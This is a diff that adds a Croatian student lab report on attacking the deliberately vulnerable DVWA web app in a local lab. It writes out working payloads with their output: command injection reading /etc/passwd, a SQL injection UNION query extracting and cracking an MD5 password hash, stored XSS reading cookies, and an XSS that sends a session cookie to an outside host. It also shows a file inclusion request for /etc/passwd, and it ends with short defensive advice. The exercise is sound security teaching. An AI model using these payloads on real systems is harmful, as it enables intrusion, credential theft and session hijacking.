@@ -1,0 +1,49 @@
+3. Laboratorijska vježba (SRS)
+
+Prvo što napravimo jest da u komandnu liniju upišemo naredbu: “ip addr” te saznajemo da je “host-only” adresa 192.168.56.101. Zatim koristimo naredbu: “sudo docker run -–rm -it -p 80:80 vunerables/web-dvwa” čime kao korisnik root pokrećemo docker instancu ranjivog web poslužitelja. Zatim se sa svog računala spajamo na ranjivi web poslužitelj na “host-only” adresi: http://192.168.56.101/. Loginamo se sa username: admin i password: password te stišćemo gumb Create / Reset Database.
+
+1)  Otvaramo prozor Command Injection te upisujemo naredbu: “1 | echo SRS” u text field. Ispod forme se ispiše “SRS”. Također upisujem naredbe: “1 | ls” (dobivamo ispis: help index.php source) te “1 | pwd & whoami & ps”.
+Sada je potrebno ispisati sadržaj datoteke /etc/paswd, a to radimo sljedećom naredbom: “1 | cat /etc/passwd” te dobijemo ovakav ispis:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+2) Otvaramo SQL Injection te upisujemo naredbu: “1’ UNION SELECT first_name, password FROM users WHERE first_name=’Pablo’ AND last_name=’Picasso’ #” te dobivamo: 
+
+“ID: 1' UNION SELECT first_name, password FROM users WHERE first_name='Pablo' AND last_name='Picasso'#
+First name: admin
+Surname: admin
+
+ID: 1' UNION SELECT first_name, password FROM users WHERE first_name='Pablo' AND last_name='Picasso'#
+First name: Pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7”.
+
+Dakle sažetak lozinke za korisnika Pabla Picassa je “0d107d09f5bbe40cade3de5c71e9e9b7”. Zatim odlazimo na Command Injection te upisujemo: “1 | echo “0d107d09f5bbe40cade3de5c71e9e9b7” > hashes.txt”. Za provjeru upisa izvodimo naredbu: “1 | cat hashes.txt” te dobivamo upravo upisan sažetak lozinke. Kako znamo da je sažetak lozinke izračunat algoritmom MD5, koristimo stranicu: https://10015.io/tools/md5-encrypt-decrypt kako bismo dobili dekriptiranu lozinku. Stvarna lozinka je: “letmein”.
+
+
+3)	Otvaramo XSS Stored. U polje Name unosim: “dominik”, a u polje Message “<script>alert(document.cookie);</script>” te klikćemo gumb “Sign Guestbook”. Dobivamo ovaj ispis: “PHPSESSID=rllmjdc4lbigh0hgp5hpc6nuf4; security=low”. Znači kolačić korisnika koji pregledava stranicu je PHPSESSID=rllmjdc4lbigh0hgp5hpc6nuf4. Iduće moramo desnim klikom na text field od Message odabrati opciju Inspect kako bismo promijenili maxlength sa 50 na recimo 500, kako bismo izveli sljedeću skriptu. Izvodimo naredbu: “<script>document.location.href='https://mrepro.tel.fer.hr/srs/?cookie=security=low;%20PHPSESSID=rllmjdc4lbigh0hgp5hpc6nuf4&jmbag=1191249229';</script>” čime preusmjeravamo korisnika na drugu stranicu. 
+Aplikaciju bih zaštitio od ovakvih ranjivosti na sljedeći način: kodirati sve što unese korisnik i izbjeći znakove <, >, {, }, “, ‘ i slične, napraviti whitelisting onoga što korisnik može unijeti te za unos HTML-a treba ga “dezinficirati” (sanitize). Koristio bih POST umjesto GET-a te HTTPOnly Cookie-i i eliminacija uzroka (ne uključivati ono što unese korisnik u izlaz aplikacije ili u povratni ispis).
+
+
+4)	Otvaram File Inclusion. U URL upisujemo “etc/passwd” te je izgled ovakav: “http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd”. Izgled stranice nalazi se na slici priloženoj u ZIP-u.
+Aplikaciju bi od navedenog napada zaštitio tako da se napravi whitelista kojim se datotekama može pristupiti, kodiranje system ruta, pripaziti na cookie vrijednosti, paziti gdje koristiti GET zahtjeve, paziti gdje koristiti POST zahtjeve.
+
